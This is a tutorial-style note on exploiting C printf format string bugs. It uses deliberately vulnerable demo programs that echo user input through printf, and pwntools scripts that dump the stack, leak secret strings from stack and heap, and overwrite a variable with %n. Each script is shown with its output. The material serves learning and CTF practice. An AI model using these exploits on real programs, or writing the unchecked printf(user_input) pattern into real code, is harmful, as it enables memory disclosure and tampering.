# printf notes

## Category
Notes

## Points
N/A

## Description
This note gives some details of the `printf` format specifier exploit

## Keywords
printf, C, pwntools 

## Notes
In certain circumstances, the C language's workhorse console display function, `printf()`, can be exploited to read or write to memory.

* [printf normal usage](#printf-normal-usage)
* [printf vulnerable usage](#printf-vulnerable-usage)
* [Reading through the stack](#reading-through-the-stack)
* [Writing to memory](#writing-to-memory)

### printf normal usage
`printf` is a function included in the `stdio.h` header for displaying text on the console. It can display various combinations of a string literal, specified in the first argument to `printf`, and variables, specified in subsequent arguments. To specify where the variables should be displayed within the string literal, we use **format specifiers**. These start with a `%`, and are followed by a letter denoting the type we are expecting (e.g. `d` for signed decimal integer, and `s` for string).

I won't cover all the possible format specifiers in this note - there are plenty of places to find that information with a quick Google - but the one's we will use will be:

| Specifier | Description
| ------    | ------
| %c | Display an argument as a char
| %d | Display an argument as a signed decimal integer
| %x | Display an argument as an unsigned hexadecimal integer
| %p | Display an argument as a pointer
| %s | Display an argument as a string
| %n | Displays nothing, but is passed a pointer argument - a pointer to a signed int - and sets that signed int to the number of characters printed out so far.

A simple example of some code using `printf` is below:
```c
#include<stdio.h>

int main()
{
  int i = 10;
  char s[] = "Fred";

  // Print a string literal
  printf("Hello, world!\n");

  // Print a string variable within a literal
  printf("Hi, %s\n", s);

  // Print a string variable and an integer within a literal
  printf("%s's age is %d\n", s, i);

  return 0;
}
```

Compiling and running this code, we get:
```
$ gcc hello-world.c -o hello-world
$ ./hello-world 
Hello, world!
Hi, Fred
Fred's age is 10
```

However, `printf` doesn't care whether the types of variables match the format specifiers. We can mess with it quite easily:
```c
#include<stdio.h>

int main()
{
  int i = 10;
  char s[] = "Fred";

  // Print a string literal
  printf("Hello, world!\n");

  // Print a signed integer, but pass a string
  printf("Hi, %d\n", s);

  // Print a hexidecimal int, passing a string, and a pointer passing an int
  printf("%x's age is %p\n", s, i);

  return 0;
}
```

Compiling and running we now get:
```
$ gcc mismatch.c -o mismatch
$ ./mismatch 
Hello, world!
Hi, 1871460560
6f8c38d0's age is 0xa
```

> It should be pointed out that if you build using `gcc` with `-Wall`, it does warn you about the `printf` mismatches:
```
$ gcc mismatch.c -o mismatch -Wall
mismatch.c: In function ‘main’:
mismatch.c:12:16: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘char *’ [-Wformat=]
   12 |   printf("Hi, %d\n", s);
      |               ~^     ~
      |                |     |
      |                int   char *
      |               %s
mismatch.c:15:12: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘char *’ [-Wformat=]
   15 |   printf("%x's age is %p\n", s, i);
      |           ~^                 ~
      |            |                 |
      |            unsigned int      char *
      |           %s
mismatch.c:15:24: warning: format ‘%p’ expects argument of type ‘void *’, but argument 3 has type ‘int’ [-Wformat=]
   15 |   printf("%x's age is %p\n", s, i);
      |                       ~^        ~
      |                        |        |
      |                        void *   int
      |                       %d
```
> This is true of things we'll do in the rest of this note, but for brevity, we'll always build with only basic warnings on.

Finally, in normal operation of `printf`, we don't have to use the parameters in the order in which they are specified. This feature of `printf` isn't always mentioned in `printf` descriptions, but it's very useful to us.

By inserting `n$` between the `%` and the format letter (where n is an integer between 1 and the number of arguments), we can specify which of the arguments we want to apply to this format specifier. An example will help explain:
```c
#include<stdio.h>

int main()
{
  int i = 20;
  int j = 10;
  int k = 5;
  char c = 'A';

  // Normal use - you can't mix positional and non-positional
  // We can repeatedly use an argument
  printf("%1$d, %4$c, %2$d, %4$c, %3$d, %4$c\n", i, j, k, c);


  // We can skip the first argument
  // What happens with the subsequent specifiers
  // is compiler/platform dependent.
  printf("%2$d %d %c\n", i, j, k, c);

  return 0;
}
```

When compiled and run, we can see how the positional arguments work:
```
$ gcc argument-select.c -o argument-select
$ ./argument-select 
20, A, 10, A, 5, A
10 5 A
```
> This output is from Clang (aliased as gcc) on MacOS X. Using gcc on Linux, the output is:
> 20, A, 10, A, 5, A
> 10 20
>
> where the arguments reset and start from the beginning, showing argument 1, 2 as integers, and then
> 3 as a character (as the value is 10, it just shows a line feed).

So how can we exploit `printf`?

### printf vulnerable usage
What happens if we use `printf` with format specifiers, but we don't specify any arguments? Let's try:
```c
#include <stdio.h>

int main()
{
  printf("%d\n%d\n%d\n");

  return 0;
}
```
We still get some output:
```
$ gcc no-args.c -o no-args
$ ./no-args 
-2060149592
-2060149576
-1444055272
```
So where are those values coming from?

Let's print more (and as hex) and see if we can work it out:
```c
#include <stdio.h>
#include <string.h>

int main()
{
  // Some variables - unused, but show up later
  char s[] = "AAAAAAAAAAAA";
  int a = 1;
  int b = 2;
  int c = 3;

  // Holds are printf format strings so we can
  // build them in a loop.
  char x[15];

  for (unsigned int i=1; i<20; ++i)
  {
    // Create our format strings for %x
    sprintf(x, "%1$d \t %%%1$d$x\n", i);

    // Show us what happens with no arguments
    printf(x);
  }

  return 0;
}
```
This prints out the offset parameter number followed by the contents at that offset, interpreted as a hexadecimal integer:
```
$ gcc -m32 no-args-x.c -o no-args-x
$ ./no-args-x 
1 	 5660e008
2 	 2
3 	 5660d1c0
4 	 0
5 	 0
6 	 5660c034
7 	 37f62a28
8 	 25200920
9 	 a782439
10 	 a78
11 	 f7db3c1e
12 	 41f613fc
13 	 41414141
14 	 41414141
15 	 414141
16 	 3
17 	 2
18 	 1
19 	 13
```
Now we can start to see what we're looking at. The first byte of offset 12, and all of offsets 13, 14 and 15 contain 12 ASCII values for the letter 'A' (`0x41`). Offset 16 has the value 3 in it, 17 has 2, and 18 has 1. These are the variables from our code! Our `s`, `a`, `b` and `c`. These are values off the stack! 

If we don't specify arguments for our `printf` format string, `printf` will take values from the current stack pointer, and continue down the stack to satisfy subsequent requests.

As a side note, I built this executable as 32-bit so it shows things a bit more clearly than a 64-bit executable. Below is the output from a 32-bit and 64-bit executables showing hexadecimal integers (`%x`) and pointers (`%p`) to clarify. It shows the relevant offsets only, which have shifted from above with the addition of more local variables to handle the %p output, and also the change between the 64-bit and 32-bit executables:

|            | 32-bit |         |            | 64-bit |        |
| :-------:  | ------ | ------- | -----      | ------ | ------ |
| **Offset** | **%x** | **%p**  | **Offset** | **%x** | **%p** |
| 13 | 33312520 | 0x33312520 | 13 | 0        | (nil)              |
| 14 | a7824    | 0xa7824    | 14 | 41c631f0 | 0x4141414141c631f0 |
| 15 | f7d7ac1e | 0xf7d7ac1e | 15 | 41414141 | 0x41414141414141   |
| 16 | 41f283fc | 0x41f283fc | 16 | 3        | 0x200000003        |
| 17 | 41414141 | 0x41414141 | 17 | 1        | 0x1100000001       |
| 18 | 41414141 | 0x41414141 | 18 | f3c631f0 | 0x561ef3c631f0     |
| 19 | 414141   | 0x414141   | 19 | 8131bd0a | 0x7ff58131bd0a     |
| 20 | 3        | 0x3        | 20 | 72064298 | 0x7ffd72064298     |
| 21 | 2        | 0x2        | 21 | 0        | 0x100000000        |
| 22 | 1        | 0x1        | 22 | f3c63145 | 0x561ef3c63145     |
| 23 | 17       | 0x17       | 23 | 8131b7cf | 0x7ff58131b7cf     |

Here we can see that `%p` shows the same information as `%x` in 32-bit executables, but in the 64-bit version, the `%p` shows the full 64-bits, while `%x` just shows the 32 Least Significant Bits (LSBs) of each address. As the 64-bit executable has 64-bit pointers, the `%x` will step 64-bits for each offset specified, but only show 32-bits of information.

This means the `%x` only shows us part of the multiple `A` string, and doesn't show the value `2`, which is actually in the most significant 32 bits of offset 16.

I advise using `%p` for displaying stack contents (at least initially). It will display full contents for every location (wheras `%x` may not), and won't crash (as `%s` does if it doesn't find a valid string) or display strange characters (like `%c`) or difficult to interpret numbers (like `%d`).

But how does any of this help us? It's very unlikely someone has accidentally created a series of format strings in their code without arguments which print out the stack and they've tested it and not noticed!

Well, something that happens more commonly (at least in CTFs) is a program taking user input and echoing it back to the user without a format string:
```c
#include <stdio.h>
#include <string.h>

#define BUFF_SIZE 40
int main(void)
{
  char user_input[BUFF_SIZE];
  char s[] = "Secret Password";
  char q[] = "quit\n";
  do {
    printf("What do you want me to say? > ");
    fgets(user_input, BUFF_SIZE, stdin);
    printf(user_input);
  } while(strcmp(q, user_input) != 0);
}
```
So, instead of using something like `printf("%s\n", user_input);` this program simply prints the user input directly back at the console. This means we can send a format string to it and we see what's on the stack!
```
$ gcc -m32 user-input.c -o user-input
$ ./user-input 
What do you want me to say? > hello
hello
What do you want me to say? > %p %p %p %p %p %p %p %p %p %p %p %p %p
0x28 0xf7f44580 0x565611d0 0x75710000 0xa7469 0x72636553 0x50207465 0x77737361 0x64726f 0x25207025 0x70252070 0x20702520 0x25207025
What do you want me to say? > quit
quit
```

If we look at this output, we can see some values at positions 6, 7, 8 and 9 that are interesting:
| Pointer value | ASCII Character |
| ----------    | ----------      |
| 0x72636553    | rceS | 
| 0x50207465    | P te | 
| 0x77737361    | wssa |
| 0x64726f      |  dro |

Because displaying this as a pointer on a Little-Endian system, the letters are reversed, but we can still make out where this comes from in the program! 

It would be more useful if we could display this as a string. However, strings aren't the same as the other format specifiers. Instead of displaying what is on the stack, `%s` displays what is pointed to by the value on the stack. Later we will manufacture the pointer ourselves to gain access to the string, but for now we'll include it in the program by adapting the previous example:
```c
#include <stdio.h>
#include <string.h>

#define BUFF_SIZE 40
int main(void)
{
  char user_input[BUFF_SIZE];
  char s[] = "Secret Password";
  char q[] = "quit\n";

  // Put a pointer to our string on the stack
  // and tell the user what to look for
  char *s_addr = s;
  printf("The pointer is %p\n",s_addr);

  do {
    printf("What do you want me to say? > ");
    fgets(user_input, BUFF_SIZE, stdin);
    printf(user_input);
  } while(strcmp(q, user_input) != 0);
}
```

Now we can search through the stack for that pointer. We use a 64-bit executable again now:
```
$ gcc user-input.c -o user-input
$./user-input 
The pointer is 0x7ffc8121f680
What do you want me to say? > %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x564de65296d7 (nil) 0x2070252070252070 0x7ffc8121f690 0x2070252070252070 0xf0b6ff 0xa7469757100c2 0x5020746572636553 0x64726f77737361 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 What do you want me to say? > 0x564de65296da
What do you want me to say? > %15$p %16$p %17$p %18$p %19$p %20$p
0x7ffc8121f680 0x564de54ef200 0x7f0bdcb2fd0a 0x7ffc8121f7b8 0x100000000 0x564de54ef155
What do you want me to say? > %15$p
0x7ffc8121f680
What do you want me to say? > %15$s
Secret Password
What do you want me to say? > quit
quit
```

We search through the stack for the pointer that the program displayed to us. Here we find it at position 15, and confirm it with a `%15$p`. Then we can print the string that the address at offset 15 points to with `%15$s`.

> *Note*: If the executable doesn't change, the offset for the location of items on the stack stays the same. For example, subsequent runs of the above will always have the string pointer at offset 15.

OK. So we can see things on the stack and display them in various ways. But what if what we want is a hundred positions deep in the stack? Or we want to just print out lots of stack to see what we have? Or the program doesn't tell us the string pointer we need to find? Python and [pwntools](https://github.com/Gallopsled/pwntools#readme) can help us out here!

### Reading through the stack
Let's start with the same program from last time, but instead of having to manually find the pointer and print the string I'll get Python to do the work. A reminder of the code:
```c
#include <stdio.h>
#include <string.h>

#define BUFF_SIZE 40
int main(void)
{
  char user_input[BUFF_SIZE];
  char s[] = "Secret Password";
  char q[] = "quit\n";

  // Put a pointer to our string on the stack
  // and tell the user what to look for
  char *s_addr = s;
  printf("The pointer is %p\n",s_addr);

  do {
    printf("What do you want me to say? > ");
    fgets(user_input, BUFF_SIZE, stdin);
    printf(user_input);
  } while(strcmp(q, user_input) != 0);
}
```

And here is some Python, using [pwntools](https://github.com/Gallopsled/pwntools#readme) to interact with the executable. Basically, the code gets the line that prints the pointer, strips the pointer out of it, and then uses a loop to send various `%n$p` specifiers until it finds the matching pointer in the stack. Then it uses that to output the string with `%n$s`:
```python
from pwn import *
import re

# Open the executable with stdbuf to stop it
# buffering input/output so recv*() functions
# work properly
p = process(["stdbuf", "-i0", "-o0", "-e0", "./user-input"])

# Read the line containing the address and strip
# out the pointer
addr = p.recvline()
addr_v = re.search('0x[0-9a-f]+', str(addr)).group(0)
print(f"Looking for pointer: {addr_v}...")

# Get the poiter for up to 30 positions
for i in range(1, 30):
    # Get the prompt
    p.recvuntil("> ")

    # Send our %n$p and see if it's
    # the position of our pointer
    p.sendline(f"%{i}$p")
    response = p.recvline().strip().decode("utf-8")
    if response == addr_v:
        break

# We got the pointer (or just completed the loop)
# Now use %n$s at that position
print(f"Found pointer at position {i}")
p.recvuntil("> ")
p.sendline(f"%{i}$s")
str_response = p.recvline().strip().decode("utf-8")
print(f"String is: {str_response}")

# Just close the process
p.close()
```

When run, this outputs:
```
$ python3 get-pointer.py 
[+] Starting local process '/usr/bin/stdbuf': pid 80008
Looking for pointer: 0x7fff08d3ec90...
Found pointer at position 15
String is: Secret Password
[*] Stopped process '/usr/bin/stdbuf' (pid 80008)
```

Of course, it's now simple just to dump a massive amount of stack so we can go through it:
```python
from pwn import *

# Open the executable with stdbuf to stop it
# buffering input/output so recv*() functions
# work properly
p = process(["stdbuf", "-i0", "-o0", "-e0", "./user-input"])

# We don't need the pointer line
p.recvline()

# Get 500 pointers from the stack
for i in range(1, 501):
    # Get the prompt
    p.recvuntil("> ")
    
    # Send a value and get the result
    p.sendline(f"%{i}$p")
    response = p.recvline().strip().decode("utf-8")
    print(f"Position {i}: {response}")

# Close it, if we haven't already crashed 
# because it's out of scope
p.close()
```

We could update this easily to print out `%p`, `%x`, `%c`, `%d`, etc. `%s`, however, adds an extra problem. Because the `%s` specifier assumes it's being passed a pointer to a `char *` array, it will try to get a string at the address it reads off the stack. This means `%s` can crash the program for out of scope memory accesses, causing `Segmentation fault` errors.

This just means we have to continually open and close the program within a loop to be able to read through the stack looking for strings:
```python
from pwn import *

# Stop all the output about starting and stopping
# the process
context.log_level = 'critical'

for i in range(1, 20):

    # We don't seem to get a recvline() when a segmentation fault
    # occurs, so we use try...except to catch program crashes
    try:
        # Open the executable with stdbuf to stop it
        # buffering input/output so recv*() functions
        # work properly
        p = process(["stdbuf", "-i0", "-o0", "-e0", "./user-input"])

        # We don't need the pointer line
        p.recvline()

        # Get the prompt
        p.recvuntil("> ")
    
        # Send a value and get the result
        p.sendline(f"%{i}$s")
        response = p.recvline().strip().decode("utf-8")
        print(f"Position {i}: {response}")
        p.close()
    except:
        # It may not be a segmentation fault, but it doesn't
        # really matter - it crashed!
        print(f"Position {i}: Segmentation error!")
        p.close()

print('Done!')
```
When we run this we can see any strings pointed to by the stack:
```
$ python3 dump-strings.py 
Position 1: 
Position 2: (null)
Position 3: H=
Position 4: %4$s
Position 5: (null)
Position 6: (null)
Position 7: Segmentation error!
Position 8: Segmentation error!
Position 9: Segmentation error!
Position 10: Segmentation error!
Position 11: (null)
Position 12: Segmentation error!
Position 13: Segmentation error!
Position 14: 
Position 15: Secret Password
Position 16: Segmentation error!
Position 17: Segmentation error!
Position 18: Segmentation error!
Position 19: Segmentation error!
Done!
```

Now we don't even need the program to tell us where the pointer is on the stack. We can just try everything! 

We have extra information, too. We know that 'Position 15' in the code contains a pointer to the stack, so we now know where the stack sits in memory. This could be useful for other exploits (including techniques not covered here).

We can even print out a string that doesn't appear on the stack, only the heap:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BUFF_SIZE 40 

int main(void)
{
  char user_input[BUFF_SIZE];
  char *s = malloc(sizeof(char) * 10);

  // Pretend I'm loaded from somewhere
  // else - not a literal in the code
  // so we can't see me with 'strings'
  strcpy(s, "Passw0rd");

  // Get the user's password and remove any trailing
  // newline character
  printf("What's the password? > ");
  fgets(user_input, BUFF_SIZE, stdin);
  user_input[strcspn(user_input, "\n")] = '\0';

  if (strcmp(s, user_input) == 0)
    printf("You're in!\n");
  else
  {
    printf("You entered: ");
    printf(user_input);
    printf("\nThat is not correct... bye!\n");
  }

  return 0;
}
```

If we look at some of the stack contents using `%p`, we can see that there isn't a copy of the password string on the stack - the password starts with `P`, which is ASCII `0x50`, so we can look at `0x50` values on the stack to check our string's not there:
```
$ python3 dump-stack-pass.py | grep 50
Position 8: You entered: 0x55fc52397250
Position 12: You entered: 0x55f410475250
```

But when we run our string output program we still find the password string, and can use it in the program:
```
$ python3 dump-strings-heap.py 
Position 1: You entered: You entered: ssword? >
Position 2: You entered: (null)
Position 3: You entered: (null)
Position 4: You entered: assword? >
Position 5: Segmentation error!
Position 6: Segmentation error!
Position 7: You entered: (null)
Position 8: Segmentation error!
Position 9: Segmentation error!
Position 10: You entered: 
Position 11: You entered: Passw0rd
Position 12: Segmentation error!
Position 13: Segmentation error!
Position 14: Segmentation error!
Position 15: Segmentation error!
Position 16: Segmentation error!
Position 17: Segmentation error!
Position 18: You entered: (null)
Position 19: Segmentation error!
Done!

$ ./heap-string
What's the password? > Passw0rd
You're in!
```

> *Note*: I haven't included the Python code for `dump-stack-pass.py` and `dump-strings-heap.py` as they are similar to the previous Python code, just with the executable name changed and some changes the `recv*()` function order.

So now we can dump the stack, and also find out roughly where the stack and heap are in memory by looking at where pointers for strings point to.

So what if there's a long string on the stack with no pointer that would take a long time to decode from hex to ASCII? What if we need to change the value of a variable? How can we write to memory, not just read it?

### Writing to memory

Can we really write to memory with an innocent `printf` format string? Yes we can!

The simplest way we can write to memory is through the input string we've been given by the program. Everything we write in our user input gets written to the stack (in our example), and we can exploit this. Here's the program we're going to exploit:
```c
#include <stdio.h>

#define BUFF_SIZE 40 
int main(void)
{

  // Stop stdout from buffering
  setvbuf(stdout, NULL, _IONBF, 0);

  // Imagine this string is loaded from a file or something,
  // not present in the executable!
  char s[] = "This string is too long to manually decode from hex, and you will never be able to print it out! Ha ha...";
  printf("I'll tell you where the string is! You still won't print it out - %p\n", s);

  char user_input[BUFF_SIZE];

  printf("Come on! Hack me! > ");
  fgets(user_input, BUFF_SIZE, stdin);
  printf("Is that really going to work? - ");
  printf(user_input);
}
```
> *Note*: We are going to build this as 32-bit so we can deal with shorter addresses (the exploit is identical for 64-bit executables, but simpler to show in 32-bit). Because of this, using `stdbuf` to control the buffers in our Python script as it won't work (it's the wrong type of ELF!). Therefore, for this example, I've turned buffering off in the C code using `setvbuf`.

This code gives us a string we need to print out. This could be a very long string that would be difficult to convert all the hex bytes to ASCII, so we'd really like to use our `%s` export to do it. But there's no pointer to this string on the stack. How can we access it?

We can start by entering some data, and then see where that appears in the stack. We'll send 8 `A`s (hex `0x41`) to the program and see if we can spot them on the stack, using a series of `%p` format specifiers:
```
$ gcc -m32 show-string.c -o show-string
$ ./show-string
I'll tell you where the string is! You still won't print it out - 0xffc93726
Come on! Hack me! > AAAAAAAA %p %p %p %p %p %p %p %p %p %p
Is that really going to work? - AAAAAAAA 0x28 0xf7f02580 0x565f81c5 (nil) (nil) 0xfffffa60 0x41410009 0x41414141 0x25204141 0x70252070
```
We can see that our `A`s start at position 7 (counting from `0x28` as 1) with 2 bytes having `0x41` in them, the 4 bytes of `0x41` in position 8, then the final 2 bytes in position 9 (followed by some `<space>%p` seen as hex `0x20 0x25 0x70`).

We can confirm those positions with:
```
$./show-string 
I'll tell you where the string is! You still won't print it out - 0xffebff96
Come on! Hack me! > AAAAAAAA %7$p %8$p %9$p
Is that really going to work? - AAAAAAAA 0x41410009 0x41414141 0x25204141
```

Let's check our theory by sending 2 `A`s, 4 `B`s and 2 `C`s so we can see if we can fill position 8 with 4 `B`s.
```
./show-string 
I'll tell you where the string is! You still won't print it out - 0xffbc85e6
Come on! Hack me! > AABBBBCC %7$p %8$p %9$p
Is that really going to work? - AABBBBCC 0x41410009 0x42424242 0x25204343
```
Yes we can! So if we can send 2 `A`s, followed by the address we want (`0xffbc85e6` on this run), we can create a pointer to the string in position 8, and print out the string using `%8$s`!

Our payload for the above example, therefore, would be something like `AAffbc86e6%8$s`, which we would send as our input string, but note 2 things:
* The address has to be written reversing the bytes as we're doing this on a little-endian machine, so should be `0xe685bcff`
* The values for the address are the ASCII characters for each value in the address, but have to be the binary bytes themselves

The second point means we can't type these in ourselves (as we can't type binary in directly), so we need to use something else instead.

We could use a simple `bash` `echo` command to build our payload and send it to a text file. Then we can pass that text file to the executable and see our 7, 8 and 9 positions:
```
$ echo -e AA\\xe6\\x85\\xbc\\xff %7\$p %8\$p %9\$p > input.txt
$ ./show-string < input.txt 
I'll tell you where the string is! You still won't print it out - 0xffef04d6
Come on! Hack me! > Is that really going to work? - AA慼� 0x41410009 0xffbc85e6 0x24372520
```
That worked! We can see our example address in position 8! However, it doesn't match the actual address for this run. We need to strip out the address printed at the console, and pass that in as the address! Let's write a Python script:
```python
from pwn import *
import re

context.log_level = 'critical'

# Run the executable
p = process("./show-string")

# Read the line containing the address and strip
# out the pointer
addr = p.recvline()
addr_h = re.search('0x[0-9a-f]+', str(addr)).group(0)
print(f"Pointer is: {addr_h}...")

# Create the payload
# This consists of 2 A characters, followed by our address,
# packed as a 32-bit value (will be correctly ordered for
# little-endian, and padded with zeros if necessary), and
# finish off with our format string
payload = b"AA" + p32(int(addr_h, 16)) + b" %7$p %8$p %9$p"

# Get to the prompt and send our payload
p.recvuntil("> ")
p.sendline(payload)

# Print out our result
print(p.recvline())

p.close()
``` 
When we run this Python script, we can see our address correctly in position 8.
```
$ python3 show-string.py 
Pointer is: 0xffa9c7f6...
b'Is that really going to work? - AA\xf6\xc7\xa9\xff 0x41410009 0xffa9c7f6 0x24372520\n'
```
Great! Now we can just change our `%p` specifiers for a `%s` one and see what happens!
```
15c15
< payload = b"AA" + p32(int(addr_h, 16)) + b" %7$p %8$p %9$p"
---
> payload = b"AA" + p32(int(addr_h, 16)) + b" -> %8$s"

$ python3 show-string.py 
Pointer is: 0xffa573b6...
b'Is that really going to work? - AA\xb6s\xa5\xff -> This string is too long to manually decode from hex, and you will never be able to print it out! Ha ha...\n'
```
And now we can see the string! 

> *Note*: In the print out of our input, part of the address is within ASCII character range, so is converted when displayed - in this case, `0x73` was shown as `s`.

Now for another way we can write to memory. This time we write an integer!

In the table of format specifiers earlier in this note you may have noticed the `%n` specifier. As a reminder, the description says `Displays nothing, but is passed a pointer argument - a pointer to a signed int - and sets that signed int to the number of characters printed out so far`. So, if we can get a pointer passed to the `%n` specifier, we can fill that memory location with a value.

That all sounds good, but how do we specify the pointer, and how can we affect what goes in there?

Let's go through an example:
```c
#include <stdio.h>
#include <stdlib.h>

#define BUFF_SIZE 40 
int main(void)
{
  int *sum;
  sum = malloc(sizeof(int));
  *sum = 2;
  printf("Sum is: %p\n", sum);
  char user_input[BUFF_SIZE];

  do {
    printf("I believe 1 + 1 = %d! Convince me otherwise! > ", *sum);
    fgets(user_input, BUFF_SIZE, stdin);
    printf("Do you think you can convince me with: ");
    printf(user_input);
  } while(*sum == 2);

  printf("\nWow! You did convince me! 1 + 1 = %d!\n", *sum);

  // Pretend the secret word is loaded from a file or something
  // rather than being hard coded so you wouldn't normally be
  // able see it!
  printf("You deserve the secret word: Snoogle!\n");
}
```
So we have a program where it continues through a loop until the value contained in `sum` changes from being `2`. We need to change that value and break out of the loop by exploiting the `printf`. We can do this by pointing a `%n` format specifier at the position on the stack where the pointer to `sum` is stored. We can influence the value written to that pointer by including some characters in the string before the `%n` - e.g. `"AAA%n"` would send 3 to the address pointed to by any pointer passed to the `%n` specifier.

Let's find our pointer on the stack and write to it!

First, we can use Python, as before, to show us the stack. We'll start by just dumping the stack so we can step through the exploit, and then we'll modify the script to complete the exploit for us, and finally create a brute force version for when we don't have the pointer printed out.

Our starting script is:
```python
from pwn import *

# Stop info output from pwntools
context.log_level = 'critical'

# Open the executable with stdbuf to stop it
# buffering input/output so recv*() functions
# work properly
p = process(["stdbuf", "-i0", "-o0", "-e0", "./sum-up"])

print(p.recvline())

for i in range(1, 20):
    # Get the prompt
    p.recvuntil("> ")
    
    # Send a value and get the result
    p.sendline(f"%{i}$p")
    response = p.recvline().strip().decode("utf-8")
    print(f"Position {i}: {response}")

# Close it
p.close()
print("Done!")
```
Running it, we can see the stack dump:
```
$ python3 dump-stack-sum.py 
b'Sum is: 0x55c5b32aa2a0\n'
Position 1: Do you think you can convince me with: 0x7ffc1b22de10
Position 2: Do you think you can convince me with: (nil)
Position 3: Do you think you can convince me with: (nil)
Position 4: Do you think you can convince me with: 0x7ffc1b230490
Position 5: Do you think you can convince me with: 0x27
Position 6: Do you think you can convince me with: 0xa70243625
Position 7: Do you think you can convince me with: (nil)
Position 8: Do you think you can convince me with: 0x55c5b14f2230
Position 9: Do you think you can convince me with: 0x55c5b14f2080
Position 10: Do you think you can convince me with: 0x7ffc1b2305b0
Position 11: Do you think you can convince me with: 0x55c5b32aa2a0
Position 12: Do you think you can convince me with: 0x55c5b14f2230
Position 13: Do you think you can convince me with: 0x7f203d6b9d0a
Position 14: Do you think you can convince me with: 0x7ffc1b2305b8
Position 15: Do you think you can convince me with: 0x100000000
Position 16: Do you think you can convince me with: 0x55c5b14f2165
Position 17: Do you think you can convince me with: 0x7f203d87d115
Position 18: Do you think you can convince me with: (nil)
Position 19: Do you think you can convince me with: 0x37e5feadda32418d
Done!
```
If we look through this stack dump, we can see that at position 11, the pointer on the stack matches the pointer displayed by the program. We can confirm this in the program, and can then send the number 3 to this pointer with `AAA%11$n`, or 10 to it with `AAAAAAAAAA%11n`:
```
$ ./sum-up 
Sum is: 0x559f559d22a0
I believe 1 + 1 = 2! Convince me otherwise! > %11$p
Do you think you can convince me with: 0x559f559d22a0
I believe 1 + 1 = 2! Convince me otherwise! > AAA%11$n
Do you think you can convince me with: AAA

Wow! You did convince me! 1 + 1 = 3!
You deserve the secret word: Snoogle!
$ ./sum-up 
Sum is: 0x55d8325c32a0
I believe 1 + 1 = 2! Convince me otherwise! > AAAAAAAAAA%11$n
Do you think you can convince me with: AAAAAAAAAA

Wow! You did convince me! 1 + 1 = 10!
You deserve the secret word: Snoogle!
```
Why are we typing our input when we can create a Python script to do everything for us?
```python
from pwn import *
import re

# Stop info output from pwntools
context.log_level = 'critical'

# Open the executable with stdbuf to stop it
# buffering input/output so recv*() functions
# work properly
p = process(["stdbuf", "-i0", "-o0", "-e0", "./sum-up"])
addr_line = p.recvline()
addr_v = re.search('0x[0-9a-f]+', str(addr_line)).group(0)
print(f"Looking for addr: {addr_v}")
    
# Get the prompt
p.recvuntil("> ")

# Try a range of positions
for i in range(1, 20):

    # Send a positional %p specifier and get the result
    p.sendline(f"%{i}$p")
    response = p.recvline().strip().decode("utf-8")
    print(f"Position {i}: {response}")

    p.recvuntil("> ")

    # Sometimes we get (nil) back, so filter them out
    if "(nil)" not in response:
        # Check if the pointer in the response is the same
        # as the one in the output
        is_addr = re.search('0x[0-9a-f]+', response).group(0)
        if is_addr == addr_v:
            print(f"Found pointer at position: {i}")
            print("Running exploit...")
            p.sendline(f"AAA%{i}$n")
            print(p.recv().strip().decode("utf-8"))
            break

p.close()
print("Done!")
```
When we run this exploit, it's all done for us!
```
$ python3 exploit-sum.py 
Looking for addr: 0x556c98cab2a0
Position 1: Do you think you can convince me with: 0x7ffedf914fe0
Position 2: Do you think you can convince me with: (nil)
Position 3: Do you think you can convince me with: (nil)
Position 4: Do you think you can convince me with: 0x7ffedf917660
Position 5: Do you think you can convince me with: 0x27
Position 6: Do you think you can convince me with: 0xa70243625
Position 7: Do you think you can convince me with: (nil)
Position 8: Do you think you can convince me with: 0x556c97dc1230
Position 9: Do you think you can convince me with: 0x556c97dc1080
Position 10: Do you think you can convince me with: 0x7ffedf917780
Position 11: Do you think you can convince me with: 0x556c98cab2a0
Found pointer at position: 11
Running exploit...
Do you think you can convince me with: AAA

Wow! You did convince me! 1 + 1 = 3!
You deserve the secret word: Snoogle!
Done!
```
